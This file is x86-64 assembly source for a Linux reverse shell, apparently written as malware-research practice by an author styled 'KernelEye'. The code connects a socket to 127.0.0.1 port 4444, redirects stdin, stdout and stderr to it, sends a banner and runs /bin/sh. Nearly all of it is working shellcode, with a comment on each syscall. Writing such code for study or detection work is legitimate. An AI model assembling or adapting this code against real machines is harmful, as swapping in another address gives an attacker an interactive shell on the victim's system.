; ====================================================
; Author : Ravindu Priyankara			             =
; Handle : KernelEye			 	                 =
; Focus  : Kernel / eBPF / Malware Research	         =
; Motto  : If you can build it, you must detect it.  =
; ====================================================


section .data
	msg db 0x1b, 0x5b, 0x33, 0x35, 0x6d, 0x4b, 0x65, 0x72, 0x6e, 0x65, 0x6c, 0x45, 0x79, 0x65, 0x1b, 0x5b, 0x30, 0x6d, 0x3a, 0x20, 0x1b, 0x5b, 0x33, 0x32, 0x6d, 0x49, 0x66, 0x20, 0x79, 0x6f, 0x75, 0x20, 0x63, 0x61, 0x6e, 0x20, 0x62, 0x75, 0x69, 0x6c, 0x64, 0x20, 0x69, 0x74, 0x2c, 0x20, 0x79, 0x6f, 0x75, 0x20, 0x6d, 0x75, 0x73, 0x74, 0x20, 0x64, 0x65, 0x74, 0x65, 0x63, 0x74, 0x20, 0x69, 0x74, 0x2e, 0x0a, 0x1b, 0x5b, 0x30, 0x6d 

	msg_len equ $ - msg

section .text
global _start


_start:

; int socket(int domain, int type, int protocol);
	push 41
	pop rax		; rax = 41 and its the socket syscall number
	push 2
	pop rdi		; rdi(1st arg) = AF_INET, AF_INET = 2
	push 1
	pop rsi		; rsi(2nd arg) = SOCK_STREAM, SOCK_STREAM = 1
	xor edx, edx	; protocol = 0
	syscall

; save socket return fd
	mov r12d, eax	

; sockaddr
	xor eax, eax	; make zero for push padding
	push rax	; 00 00 00 00 00 00 00 00	; padding
	push 0x0100007f	; 7f 00 00 01	; ip address 
	push word 0x5c11; 11 5c	; port number
	push word 0x2	; 02 00	; AF_INET(sin_family)

; connect
	push 42
	pop rax		; rax = 42 and its the connect syscall number
	mov edi, r12d	; rdi(1st arg) = sockfd
	mov rsi, rsp	; rsi = sockaddr_in
	mov edx, 16	; edx = length of sockaddr
	syscall

; if connection failed;
	test eax, eax	
	js exit		; jump if sign bit set (negative = connection error)

; dup2
	push 33		
	pop rax		; rax = 33 and it's the dup2 syscall number
	mov edi, r12d	; oldfd
	xor esi, esi	; newfd (0 stdin)
	syscall
	
	push 33
	pop rax
	inc esi		; newfd (1 stdout)
	syscall

	push 33
	pop rax
	inc esi		; newfd (2 stderr)
	syscall

;msg
	push 1
	pop rax		; write syscall number
	mov edi, r12d	; sockfd
	lea rsi, [msg]	; msg
	mov edx, msg_len ; msg length
	syscall

; execve
	push 59
	pop rax		; rax = 59 and its the execve syscall number
	xor esi, esi	; argv = NULL
	push rsi	; NULL Terminator 
	mov rbx, 0x68732f2f6e69622f	; /bin//sh
	push rbx	; push string to the stack
	mov rdi, rsp 	; string + null terminator
	mov edx, esi	; envp also null
	syscall

exit:
	push 60
	pop rax		; rax = 60 and its the exit syscall number
	xor edi, edi	; stdin
	syscall
